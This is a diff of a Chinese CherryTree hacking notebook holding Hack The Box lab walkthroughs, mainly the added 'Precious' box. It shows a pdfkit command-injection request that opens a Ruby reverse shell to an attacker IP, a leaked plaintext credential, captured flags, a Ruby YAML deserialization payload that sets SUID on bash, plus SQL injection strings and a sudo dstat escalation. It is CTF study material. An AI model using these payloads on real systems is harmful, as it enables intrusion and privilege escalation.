@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="hack_tips" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649902547" ts_lastsave="1677759359">
+  <node name="hack_tips" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649902547" ts_lastsave="1677825425">
     <rich_text scale="h3" weight="heavy">需要安装的脚本工具：</rich_text>
     <rich_text>
 
@@ -110,6 +110,8 @@ nmap -sC -sV -p $ports 10.10.11.194 -Pn
 
 • 发现某些特殊服务框架，如 80 端口用的是 nostromo 1.9.6 框架，尝试用 searchsploit 搜索一下是否存在公共漏洞
 
+• 如果是工具型网站，比如 web 转 pdf 网站，就从网站所用的工具框架入手，搜索看是否存在漏洞
+
 • 如果网页没有登录窗口且未发现特别的攻击点，尝试用 dirbuster 枚举一下网站目录
 
 • 未枚举到特殊目录，尝试枚举子域名
@@ -138,6 +140,11 @@ admin'-- -   (-- 代表注释，mysql 后必须跟个空格才生效)
 1' ORDER BY 1 -- -    （按第一列排序，一直试，直到某一列报错，比如 BY 4 报错，说明这条查询语句返回的列数为 3）
 1' UNION SELECT null,null,null-- - （SELECT 会在返回结果中插入一条数据，但返回数据列数和类型要统一。为了保证和实际数据类型统一，用 NULL 表示，如果三个 NULL 未报错，说明查询结果有 3 列）
 1' UNION SELECT 1,database(),3-- - （上条语句先确认返回列数，然后便可在返回数据中插入自己想要的数据，如 user(),database() 等等）
+
+• </rich_text>
+    <rich_text weight="heavy">ExifTool</rich_text>
+    <rich_text> 是一款强大的图片元数据编辑工具，可以读取、编辑、写入多种格式的文件，包括JPEG、TIFF、PNG、GIF、BMP、JPEG 2000、WebP、DNG、HEIC、PDF、EPS、PSD、。。。。。
+如果网站只有一张奇怪的照片，或者PDF等，可以看下其元数据有没有奇怪的地方。
 
 
 </rich_text>
@@ -266,7 +273,7 @@ msfvenom -l payloads 列出所有 payloads
 • Payloads 页面 Payloads options 中选择密码字典文件
 • 点击右上角 start attack 开始进行爆破
 • 点击 length 列排序，找到返回长度不同的那个请求观察结果</rich_text>
-    <codebox char_offset="4426" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">#include &lt;stdio.h&gt;
+    <codebox char_offset="4629" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 
 int main(int argc, char** argv) {
@@ -276,7 +283,7 @@ int main(int argc, char** argv) {
         return 0;
 }
 </codebox>
-    <codebox char_offset="4571" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) disas main	(显示对应方法的机器代码)
+    <codebox char_offset="4774" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) disas main	(显示对应方法的机器代码)
 Dump of assembler code for function main:
    0x0000000000001139 &lt;+0&gt;:     push   %rbp
    0x000000000000113a &lt;+1&gt;:     mov    %rsp,%rbp
@@ -294,7 +301,7 @@ Dump of assembler code for function main:
    0x0000000000001176 &lt;+61&gt;:    leave  
    0x0000000000001177 &lt;+62&gt;:    ret    
 End of assembler dump.</codebox>
-    <codebox char_offset="4701" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) run $(python2 -c 'print "\x41" * 526')
+    <codebox char_offset="4904" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) run $(python2 -c 'print "\x41" * 526')
 Program received signal SIGSEGV, Segmentation fault.
 0x0000414141414141 in ?? ()
 (gdb) info registers	(查看寄存器信息)
@@ -3983,7 +3990,7 @@ def get_usernames():
 for u in get_usernames():
     get_password(u)</codebox>
   </node>
-  <node name="Soccer-websocket-sqli" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677591992" ts_lastsave="1677763672">
+  <node name="Soccer-websocket-sqli" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677591992" ts_lastsave="1677764121">
     <rich_text>1. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.194 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//) 
 nmap -sC -sV -p $ports 10.10.11.194 -Pn
 Starting Nmap 7.93 ( </rich_text>
@@ -4127,6 +4134,143 @@ uid=0(root) gid=0(root) groups=0(root)
 </rich_text>
     <codebox char_offset="4203" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">echo 'import os; os.execv("/bin/sh", ["sh"])' &gt;/usr/local/share/dstat/dstat_xxx.py
 sudo dstat --xxx</codebox>
+  </node>
+  <node name="Precious" unique_id="112" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677764121" ts_lastsave="1677845876">
+    <rich_text>1. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.189 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//) 
+nmap -sC -sV -p $ports 10.10.11.189 -Pn
+Starting Nmap 7.93 ( </rich_text>
+    <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+    <rich_text> ) at 2023-03-02 21:37 CST
+Nmap scan report for 10.10.11.189
+Host is up (0.14s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
+|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
+|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to </rich_text>
+    <rich_text link="webs http://precious.htb/">http://precious.htb/</rich_text>
+    <rich_text>
+|_http-server-header: nginx/1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+2. 自己在本地编辑一个 html，通过网站转成 pdf ，然后下载下来，用 exiftool 工具检测 pdf 元数据发现
+exiftool olr99xtre1wob8zj9yqnovvp813fb8ks.pdf
+ExifTool Version Number         : 12.49
+File Name                       : olr99xtre1wob8zj9yqnovvp813fb8ks.pdf
+Directory                       : .
+File Size                       : 9.9 kB
+File Modification Date/Time     : 2023:03:03 11:51:59+08:00
+File Access Date/Time           : 2023:03:03 11:52:03+08:00
+File Inode Change Date/Time     : 2023:03:03 18:54:36+08:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.4
+Linearized                      : No
+Page Count                      : 1
+Creator                         : Generated by </rich_text>
+    <rich_text foreground="#e0e01b1b2424">pdfkit v0.8.6</rich_text>
+    <rich_text>
+
+3. google </rich_text>
+    <rich_text foreground="#e0e01b1b2424">pdfkit</rich_text>
+    <rich_text> 相关漏洞，搜到
+</rich_text>
+    <rich_text link="webs https://github.com/shamo0/PDFkit-CMD-Injection">https://github.com/shamo0/PDFkit-CMD-Injection</rich_text>
+    <rich_text>
+
+curl '</rich_text>
+    <rich_text link="webs http://precious.htb/">http://precious.htb</rich_text>
+    <rich_text>' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: TARGET_ADDRESS' -H 'Connection: keep-alive' -H 'Referer: TARGET_ADDRESS' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2F10.10.16.3%3A80%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.16.3%22%2C9001%29%29%27%60'
+
+修改命令后成功 get shell。
+
+4. ruby@precious:~$ cat .bundle/config
+cat .bundle/config
+---
+BUNDLE_HTTPS://RUBYGEMS__ORG/: "</rich_text>
+    <rich_text foreground="#e0e01b1b2424">henry:Q3c1AqGHtoI0aXAYFH</rich_text>
+    <rich_text>"
+
+5. ssh </rich_text>
+    <rich_text foreground="#e0e01b1b2424">henry</rich_text>
+    <rich_text>@10.10.11.189,    登录成功，获取 user flag。
+</rich_text>
+    <rich_text foreground="#e0e01b1b2424">197a71f0b8d678cd7d590a28fd390e8e</rich_text>
+    <rich_text>
+
+6.  sudo -l
+Matching Defaults entries for henry on precious:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User henry may run the following commands on precious:
+  </rich_text>
+    <rich_text foreground="#e0e01b1b2424">  (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb</rich_text>
+    <rich_text>
+    
+    cat /opt/update_dependencies.rb
+# Compare installed dependencies with those specified in "dependencies.yml"
+require "yaml"
+require 'rubygems'
+
+# TODO: update versions automatically
+def update_gems()
+end
+
+def list_from_file
+    </rich_text>
+    <rich_text foreground="#e0e01b1b2424">YAML.load(File.read("dependencies.yml"))</rich_text>
+    <rich_text>
+end
+.......................................
+
+观察文件代码，发现该点可能存在漏洞，是否可以通过编辑dependencies.yml，进行任意代码执行？通过搜索  ruby </rich_text>
+    <rich_text foreground="#e0e01b1b2424">YAML.load</rich_text>
+    <rich_text>   相关漏洞  </rich_text>
+    <rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md</rich_text>
+    <rich_text>
+
+
+
+修改 git_set: id  为   git_set</rich_text>
+    <rich_text foreground="#bf2e5e">:</rich_text>
+    <rich_text> </rich_text>
+    <rich_text foreground="#bf2e5e">chmod</rich_text>
+    <rich_text> +s </rich_text>
+    <rich_text foreground="#bf2e5e">/</rich_text>
+    <rich_text>bin</rich_text>
+    <rich_text foreground="#bf2e5e">/bash</rich_text>
+    <rich_text>
+
+然后成功获取root flag。
+
+</rich_text>
+    <rich_text foreground="#e0e01b1b2424">7a686a3cfc0b7be13e414a7b3962077b</rich_text>
+    <codebox char_offset="3294" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &amp;1 !ruby/object:Net::BufferedIO
+      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &amp;1 !ruby/object:Net::WriteAdapter
+         socket: &amp;1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: chmod +s /bin/bash
+         method_id: :resolve
+</codebox>
   </node>
   <node name="Legacy-Windows" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664271968" ts_lastsave="1675928583">
     <rich_text>1. nmap -sV -sC 10.10.10.4              
